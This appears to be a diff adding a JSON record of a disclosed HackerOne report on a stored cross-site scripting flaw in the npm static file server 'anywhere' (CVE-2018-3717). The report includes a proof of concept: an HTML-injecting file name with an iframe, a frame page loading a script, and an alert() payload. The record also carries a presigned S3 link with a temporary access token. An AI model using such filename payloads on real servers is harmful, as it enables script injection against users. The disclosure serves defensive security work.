@@ -1,0 +1,141 @@
+{
+  "id": 309394,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDkzOTQ=",
+  "url": "https://hackerone.com/reports/309394",
+  "title": "[anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-25T22:02:33.743Z",
+  "submitted_at": "2018-01-25T22:02:33.743Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3717"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-02-26T21:36:11.607Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-26T21:36:03.624Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**anywhere** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.\n\n**Module:** \n\nRunning static file server anywhere.\n\nhttps://www.npmjs.com/package/anywhere\n\n**Description**\n\n\n\nTo embed malicious ```<script>``` tag with JavaScript code to execute, ```/``` character is necessary.\nIn all operating systems, ```/``` is not allowed as a character used in file name. This means there is very few option to craft an attack using file name as injection point.\n\n## Steps To Reproduce:\n\nHowever, if attacker wants to, one can still use some tricks and change one of the filenames into something like following example:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\nThen, HTML file with following content have to be saved in the same directory as file with the name changed:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script type=\"text/javascript\" src=\"malware.js\"></script>\n</body>\n\n</html>\n```\n\nAn ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.\nOn my local machine, ```malware.js``` has following content:\n\n```javascript\nalert('Uh oh, I am very bad malware!')\n```\n\nNow, if you run ```anywhere``` in directory where both file with filename changed and ```malware_frame.html``` are saved:\n\n```\n$ ./node_modules/anywhere/bin/anywhere -p 8080\nRunning at http://192.168.1.1:8080/\nAlso running at https://192.168.1.1:8081/\n```\n\nand open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed:\n\n{F257400}\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nExploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```anywhere``` is used to serve static content.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 257400,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/400/4ad79e07ebfe740d475a2ba1bc133f5d0efd6452/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTEONG6H3%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T024921Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA0qQ3n68uyAcSswNFgYef6rSygdp2exrGk%2FLNqUffMZAiAPA32PeaUgaN5rC9OzDYsSl5gCddih7VJHo19w3b4TkCq6BQik%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNgbKltJ2KIwU5TBUKo4FyHSCQ3QzY8UHBqsIQC3f%2BN29lfkdChFEpyJK5tU835U%2FLJQW1Kfwc1e6EPwTzSU9krFWaeCJyMITbpKaftPaD1BPPwlc%2BNsp1GGUQ45p4ZeWMmK1wyWejha3%2Fa2DzW%2FwrbUZ%2FU4bxG5BEWb9SWjhVM1j94e%2FvQ%2Bo606Kjf99HRBpTNxivRngAgoXSxSdAcXySlpPPq2i6uLC7ppI7Ro15WMZ0Drc5xaPBG6xS0mwU42ujZNIzOPT5GYXtIH7jpOSqDv0RxGFp%2FVEKhHxuDw8bGh8Wqw%2Buw7eLc%2B9hDGrCCBQvuHQCy4h0BSPuX2q%2FCmJggCfPz994%2BKGJ27a5UDAm2XxrSZDwz9Q4pAOR9ocwP1VfyQ4KvTKnMmjlK9%2BUbb8ddgw0YsOWzTE%2BgAWaoP2NwUU8rXbwkeA3c3aEOjm9Vzh%2FwGuGtb2WSjqV%2Bq0uViHlr3xZ2M08hoiui0e3lzihlmwWlr2Gf2EwRHkZeti6%2B78VP6sWIxg7VJgYOXLLrSnhkOS8uVuO0L008jYjg3hYdpviVyYK%2BwuOT%2FBmrxvDixZhLGyFp%2FLAaEv482XruQUPBrNOOiOLyGLZF3kNUgTBOD4fYAtg1GdIGZGmAWcri6OtuWWXnwuW8yvTy%2Fa6eXVYHPHQi1PfB9p8ApsPSADB6ipOAPBC%2BDrBqYb32d7Nng4YA6QL4AAJPF8ar51eCshgLRpm05UA53PO4MXfS%2BvuBhN9jG8C52J90QZlQtn3HbjtssiICDIYW1DMjnIPXApVbj%2Bq95QpoCAo17kMsgkS14BHM36MD69tnY7kGD%2F4sCKecPYV5zd2iTaWnKZY3G8WleFvgxLWyc8FhpZHQKeml%2F5SXlF9z06rVDtnSJYMKCu5MwGOrIBzsVZoh6F%2B4fdVkm8vL5B7wuxt5Bo0ukiyuV7QOLU%2F5jV17uO72TfAusKkSOhqaW12WrAdVogqt3tR6umcGNw%2FoEWrDmtUP4QQD8KejMqOt99SpGsgprtuJHMfPj45IgwONP4cJqSaKW82zIV4ZSFygptqAkyjBgS3ovqAPcJFw1CLETP9iOLUcJ8mD3B4TKmwtmbE1zeHYxOAYCo%2BLHf6%2FxzlQfe5rNai%2Fm25w9rV6sn3g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=279ff51a540c295adfe7a6371856136a11b6e9da96dcedd71d01ed5a5181402d",
+      "file_size": 357574,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-28T21:36:03.733Z",
+  "allow_singular_disclosure_after": -249369198.00073078,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "apapedulimu",
+    "dudez",
+    "eveeez",
+    "13ern",
+    "khalooda0x",
+    "madhuri_jan02"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5782,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "anywhere",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
